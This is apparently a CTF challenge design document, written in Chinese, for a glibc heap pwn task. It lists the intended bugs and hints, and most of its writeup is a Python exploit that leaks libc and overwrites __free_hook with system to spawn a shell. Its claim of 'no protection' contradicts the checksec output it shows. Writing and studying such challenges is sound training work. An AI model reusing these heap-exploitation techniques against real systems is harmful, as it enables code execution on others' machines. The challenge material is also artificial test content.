# 赛题设计说明

## 题目信息：

* 题目名称：pwn
* 预估难度：中等偏难 
* 编译命令：gcc -fstack-protector-all -D_FORTIFY_SOURCE=2 -z now -o pwn pwn.c

## 题目描述：

> welcome to be dessert of kotori

## 题目考点：

1. off by one
2. uaf
3. double free


## 思路简述：
有一个字节的溢出可以改flag标志

然后通过fastbin attack修改bss段上max的值

再通过unsorted bin leak libc

再劫持__free_hook


## 题目提示：
1. bss段上有惊喜
2. off by one
3. __free_hook,main_arena


## 原始 flag 及更新命令：

```shell
    # 原始 flag
    flag{flag_test}
    # ..
    # 更新 flag 命令
    echo 'flag{85c2a01a-55f7-442a-8712-3f6908e1463a}' > /flag
```

## 题目环境：

1. Ubuntu 16.04 LTS
2. xinetd + chroot

## 题目制作过程：

1. 编写 pwn.c 代码，详细代码请从 “源码” 文件夹获取，
2. 编译方式在make.sh，

## 题目 writeup：

1. 检查题目保护，发现无保护

   kotori@kotori-virtual-machine  ~/ctf/my_pwn/ciscn  checksec pwn
   [*] '/home/kotori/ctf/my_pwn/ciscn/pwn'
       Arch:     amd64-64-little
       RELRO:    Full RELRO
       Stack:    Canary found
       NX:       NX enabled
       PIE:      No PIE (0x400000)

2.  

   ```python
   #change max
   #在bss段上伪造fastbin header来在malloc一块可以覆盖max的区域
   for i in range(18):
       add(str(i),0x20,'AAAA','\x00' * 8)
   add('18',0x20, 'AAAA', '\x00' * 8 + '\x31')
   eat(1)
   eat(2)
   eat(0)
   add('A',0x20,'AAAA','\x00' * 8 + '\x01')#0
   eat(1)
   #gdb.attach(p)
   add('A', 0x20, p64(0x6022b8) + p64(0x6022b8), '\x00' * 8)#1
   add('A', 0x20, 'AAAA', '\x00' * 8)#2
   change(2, 0x20, 'AAAA')
   #gdb.attach(p)
   change(2, 0x20, 'A' * 24 + p64(0x30000))
   #db.attach(p)
   #leak libc
   eat(4)
   add('4', 0x100, 'AAAA', '\x00' * 8)
   change(1, 0x40, 'AAAA')
   #gdb.attach(p)
   eat(4)
   add('4', 0x100, 'a' * 8, '\x00' * 8 + '\x01')
   #gdb.attach(p)
   show(4)
   print p.recvline()
   print p.recvline()
   print p.recvline()
   print p.recvline()
   main_arena = u64((p.recvline()[8:14]).ljust(8,'\x00')) - 88
   print hex(main_arena)
   libc_base = main_arena - 0x3C4B20
   malloc_hook = libc_base + 0x3c4b10
   one_gadget = libc_base + 0x45216
   free_hook = libc_base + 0x3c67a8
   system = libc_base + 0x45390
   print hex(libc_base)
   
   
   
   
   #fake chunk header in main_arena
   #gdb.attach(p)
   eat(10)
   eat(11)
   add('A',0x60,'AAAA','\x00' * 8)#10
   add('A',0x60,'AAAA','\x00' * 8)#11
   eat(10)
   eat(11)
   eat(9)
   add('A',0x20,'AAAA','\x00' * 8 + '\x01')#9
   eat(10)
   #gdb.attach(p)
   add('A',0x60,p64(0x51) + p64(0x51),'\x00' * 8)#10
   add('A',0x60,'AAAA','\x00' * 8)#11
   change(11, 0x60, 'AAAA')
   
   
   
   #将double free伪造chunk分配到main_arena上，改top 为free_hook - 0xb58
   eat(13)
   eat(14)
   add('A',0x40,'AAAA','\x00' * 8)#13
   add('A',0x40,'AAAA','\x00' * 8)#14
   eat(13)
   eat(14)
   eat(12)
   add('A',0x20,'AAAA','\x00' * 8 + '\x01')#12
   eat(13)
   #gdb.attach(p)
   add('A', 0x40, p64(main_arena + 0x28) + p64(main_arena + 0x28), '\x00' * 8)#13
   add('A', 0x40, 'AAAA', '\x00' * 8)#14
   change(11, 0x40, 'AAAA')
   #gdb.attach(p)
   change(11, 0x40, '\x00' * 0x20 + p64(free_hook - 0xb58))
   
   
   #改free_hook为system，getshell
   for i in range(5):
       eat(i + 4)
   for i in range(5):
       add('A', 0x1f0, '\x00', '\x00' * 8)
   #gdb.attach(p)
   
   eat(15)
   eat(16)
   add('A', 0x200, '\x00' * 0x148 + p64(system),'\x00' * 8)
   bin_sh = libc_base + 0x18cd57
   add('sh'.ljust(0x10,'\x00'),0x20, 'sh'.ljust(0x20, '\x00'), '\x00' * 8)
   print hex(free_hook)
   print hex(system)
   #gdb.attach(p)
   eat(16)
   ```

3. 编写 exp.py ，获取flag，详细代码请从 “exp脚本” 文件夹获取

## 注意事项

1. 题目名称不要有特殊符号，可用下划线代替空格；
2. 根据设计的赛题，自行完善所有文件夹中的信息；
3. 此文件夹下信息未完善的队伍，将扣除一定得分。